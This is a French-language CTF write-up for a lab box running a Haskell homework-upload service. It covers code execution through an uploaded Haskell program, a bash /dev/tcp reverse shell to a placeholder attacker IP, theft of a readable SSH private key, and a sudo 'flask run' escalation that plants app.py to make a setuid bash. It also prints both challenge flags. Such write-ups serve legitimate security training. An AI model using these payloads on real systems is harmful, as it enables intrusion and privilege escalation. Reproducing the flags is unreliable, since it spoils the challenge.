# CTF "FUN with functionnal !" — 10.10.0.49

## Recon

nmap -sC -sV 10.10.0.49
22/tcp   SSH OpenSSH 10.0p2 Debian
5001/tcp HTTP Werkzeug 3.1.8 Python 3.13.5 — "FUN with functionnal !"

⚠️ Le service est sur le port 5001, pas 80/443.

## Découverte

Page d'accueil (http://10.10.0.49:5001/) renvoie vers /homework : un formulaire d'upload de fichier .hs, censé être envoyé à un "outil d'autocorrection" Haskell. Le pitch de la page ("c'est sécurisé car c'est Haskell") est un piège du challenge.

## Exploitation — RCE via upload Haskell

Le fichier uploadé est réellement compilé et exécuté côté serveur (ghc, output visible dans la réponse). System.Process.callCommand permet l'exécution de commandes shell arbitraires, en tant que www-data.

Payload minimal qui marche :

import System.Process

main :: IO ()
main = do
  putStrLn "I love Haskell"
  callCommand "<COMMANDE>"

⚠️ Le serveur gère mal plusieurs commandes enchaînées dans un seul callCommand (renvoie "Couldn't compile your haskell program"). Il faut décomposer : une commande simple par upload.

### Upgrade en reverse shell

import System.Process

main :: IO ()
main = do
  putStrLn "I love Haskell"
  callCommand "bash -c 'bash -i >& /dev/tcp/TON_IP/4444 0>&1'"

Avec un listener côté attaquant :

nc -lvnp 4444

## Chemin jusqu'à user.txt

ls -la /home/            → révèle un dossier "prof"
ls -la /home/prof/       → révèle user.txt
cat /home/prof/user.txt

Flag user.txt :
EPI{h4sK377_C4n_83_r3vsh3ll_4s_W3lL}

## Privesc → user prof

/home/prof/.ssh/id_rsa est lisible par tout le monde (-rw-r--r-- prof prof), permettant de récupérer la clé privée directement via le shell www-data.

cat /home/prof/.ssh/id_rsa
→ copier le contenu dans un fichier local, chmod 600, puis :

ssh -i prof_id_rsa prof@10.10.0.49

## Privesc → root

sudo -l

User prof may run the following commands on lambda:
    (root) NOPASSWD: /usr/local/bin/flask run

La règle sudoers autorise exactement /usr/local/bin/flask run, sans argument ni variable d'environnement (FLASK_APP=... et --app ... sont bloqués par sudo car non listés dans les env vars autorisées).

Contournement : Flask cherche par défaut un fichier app.py dans le répertoire courant, et sudo préserve le cwd. En plaçant un app.py malveillant dans le dossier depuis lequel sudo flask run est lancé, le code s'exécute en root au moment de l'import.

mkdir /tmp/flaskapp
cd /tmp/flaskapp
cat > app.py << 'EOF'
import os
os.system("cp /bin/bash /tmp/rootbash2; chmod +s /tmp/rootbash2")

from flask import Flask
app = Flask(__name__)
EOF

sudo /usr/local/bin/flask run
# Ctrl+C une fois le serveur démarré

/tmp/rootbash2 -p
cat /root/root.txt

Flag root.txt :
EPI{7VRns_0U7_p17H0N_1S_n0_83773r}